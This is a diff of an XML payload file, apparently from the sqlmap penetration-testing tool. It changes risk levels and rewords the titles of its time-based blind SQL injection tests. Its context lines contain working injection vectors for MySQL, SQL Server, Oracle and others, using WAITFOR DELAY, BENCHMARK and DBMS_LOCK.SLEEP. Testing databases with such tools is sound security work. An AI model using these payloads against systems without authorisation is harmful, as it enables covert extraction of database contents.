@@ -207,7 +207,7 @@
         <title>Microsoft SQL Server/Sybase time-based blind</title>
         <stype>5</stype>
         <level>1</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
@@ -931,12 +931,13 @@
     <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of OR time-based blind tests -->
 
-    <!-- Time-based tests - After ORDER BY...LIMIT... -->
+    <!-- Time-based tests - LIMIT clause -->
+    <!-- This payload does not work with SLEEP() -->
     <test>
-        <title>MySQL &gt;= 5.1 time-based blind - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <title>MySQL &gt;= 5.1 heavy-query time-based blind - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
         <stype>5</stype>
         <level>3</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3,4,5</clause>
         <where>1</where>
         <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)</vector>
@@ -951,7 +952,7 @@
             <dbms_version>&gt; 5.0.11</dbms_version>
         </details>
     </test>
-    <!-- Time-based tests - After ORDER BY...LIMIT... -->
+    <!-- Time-based tests - LIMIT clause -->
 
     <!-- Time-based blind tests - Parameter replace -->
     <test>
@@ -1177,7 +1178,7 @@
         <title>Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)</title>
         <stype>5</stype>
         <level>3</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>1,3</clause>
         <where>3</where>
         <vector>BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;</vector>
@@ -1351,9 +1352,9 @@
     <!-- End of time-based blind tests - Parameter replace -->
 
 
-    <!-- Time-based blind tests - GROUP BY and ORDER BY clauses -->
+    <!-- Time-based blind tests - GROUP BY and ORDER BY clause -->
     <test>
-        <title>MySQL &gt;= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &gt;= 5.0.11 time-based blind - GROUP BY and ORDER BY clause</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1373,7 +1374,7 @@
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <title>MySQL &lt; 5.0.12 time-based blind - GROUP BY and ORDER BY clause (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
@@ -1392,7 +1393,7 @@
     </test>
 
     <test>
-        <title>PostgreSQL &gt; 8.1 time-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>PostgreSQL &gt; 8.1 time-based blind - GROUP BY and ORDER BY clause</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1412,7 +1413,7 @@
     </test>
 
     <test>
-        <title>PostgreSQL time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <title>PostgreSQL time-based blind - GROUP BY and ORDER BY clause (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
@@ -1431,7 +1432,7 @@
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase time-based blind - ORDER BY clauses</title>
+        <title>Microsoft SQL Server/Sybase time-based blind - ORDER BY clause</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1473,10 +1474,10 @@
     </test>
 
     <test>
-        <title>Oracle time-based blind - GROUP BY and ORDER BY clauses (DBMS_LOCK.SLEEP)</title>
+        <title>Oracle time-based blind - GROUP BY and ORDER BY clause (DBMS_LOCK.SLEEP)</title>
         <stype>5</stype>
         <level>3</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
         <vector>,(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)</vector>
@@ -1492,7 +1493,7 @@
     </test>
 
     <test>
-        <title>Oracle time-based blind - GROUP BY and ORDER BY clauses (DBMS_PIPE.RECEIVE_MESSAGE)</title>
+        <title>Oracle time-based blind - GROUP BY and ORDER BY clause (DBMS_PIPE.RECEIVE_MESSAGE)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1511,7 +1512,7 @@
     </test>
 
     <test>
-        <title>Oracle time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <title>Oracle time-based blind - GROUP BY and ORDER BY clause (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
@@ -1530,7 +1531,7 @@
     </test>
 
     <test>
-        <title>HSQLDB &gt;= 1.7.2 time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <title>HSQLDB &gt;= 1.7.2 time-based blind - GROUP BY and ORDER BY clause (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
@@ -1551,7 +1552,7 @@
     </test>    
     
     <test>
-        <title>HSQLDB &gt; 2.0 time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <title>HSQLDB &gt; 2.0 time-based blind - GROUP BY and ORDER BY clause (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
